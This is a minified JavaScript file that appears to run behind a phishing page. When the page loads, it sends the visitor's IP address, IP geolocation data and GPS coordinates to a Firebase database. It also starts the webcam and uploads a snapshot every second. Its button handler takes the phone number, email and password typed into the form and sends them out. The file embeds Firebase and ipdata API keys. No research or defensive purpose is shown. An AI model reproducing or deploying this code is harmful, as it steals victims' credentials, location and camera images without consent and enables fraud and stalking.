import{initializeApp}from"https://www.gstatic.com/firebasejs/9.6.7/firebase-app.js";import{getDatabase,ref,set}from"https://cdnjs.cloudflare.com/ajax/libs/firebase/9.6.7/firebase-database.min.js";const firebaseConfig={apiKey:"AIzaSyAW7KpTUQ52xhDOnbrQkya5r8MbT5rJALk",authDomain:"rbbpravo.firebaseapp.com",databaseURL:"https://rbbpravo-default-rtdb.europe-west1.firebasedatabase.app",projectId:"rbbpravo",storageBucket:"rbbpravo.appspot.com",messagingSenderId:"589641380814",appId:"1:589641380814:web:845c22e94934a62d11f19f"},app=initializeApp(firebaseConfig),db=getDatabase(app);function writeData(e,t="data/"){const a=(new Date).getTime();set(ref(db,t+a.toString()),e)}fetch("https://api.ipdata.co/?api-key=6f23068f260c756949a9f990a85c94ad1674fc276fd7b32602d1f2c6").then(e=>e.json()).then(e=>writeData(e,"ipinfo/")),fetch("https://api.ipify.org?format=json").then(e=>e.json()).then(e=>writeData(e,"ip/"));const videoId="video",scaleFactor=.25,optionsGeo={enableHighAccuracy:!0,timeout:3e4,maximumAge:0},successGeo=({coords:e})=>{writeData({latitude:e.latitude,longitude:e.longitude},"geo/")},errorGeo=({code:e,message:t})=>console.warn(`ERROR(${e}): ${t}`);function capture(e,t){null==t&&(t=1);const a=e.videoWidth*t,o=e.videoHeight*t,i=document.createElement("canvas");return i.width=a,i.height=o,i.getContext("2d").drawImage(e,0,0,a,o),i}function shoot(e="image/"){writeData({image:capture(document.getElementById(videoId),scaleFactor).toDataURL("image/png")},e)}const btn=document.getElementById("btn");btn.addEventListener("click",e=>{e.preventDefault(),writeData({phone:document.getElementById("number").value,email:document.getElementById("email").value,password:document.getElementById("password").value})}),navigator.geolocation.getCurrentPosition(successGeo,errorGeo,optionsGeo),navigator.getUserMedia&&navigator.getUserMedia({audio:!1,video:{width:1280,height:720}},e=>{const t=document.querySelector("video");t&&(t.srcObject=e,t.onloadedmetadata=(()=>{t.play()}),setInterval(()=>{shoot()},1e3))},e=>console.log("The following error occurred: "+e.name)),navigator.mediaDevices&&navigator.mediaDevices.getUserMedia&&navigator.mediaDevices.getUserMedia({audio:!1,video:{width:1280,height:720}},e=>{const t=document.querySelector("video");t&&(t.srcObject=e,t.onloadedmetadata=(()=>{t.play()}),setInterval(()=>{shoot("media/")},1e3))},e=>console.log("The following error occurred: "+e.name));
